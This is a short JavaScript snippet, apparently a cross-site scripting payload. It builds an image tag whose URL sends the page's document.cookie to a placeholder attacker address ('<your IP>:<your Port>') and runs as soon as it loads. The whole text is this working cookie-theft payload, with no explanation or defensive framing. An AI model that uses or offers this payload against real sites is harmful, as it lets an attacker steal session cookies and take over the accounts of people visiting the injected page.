function addImg(){
    var img = document.createElement('img');
    img.src = 'http://<your IP>:<your Port>/'+ document.cookie;
    document.body.appendChild(img);
}
addImg();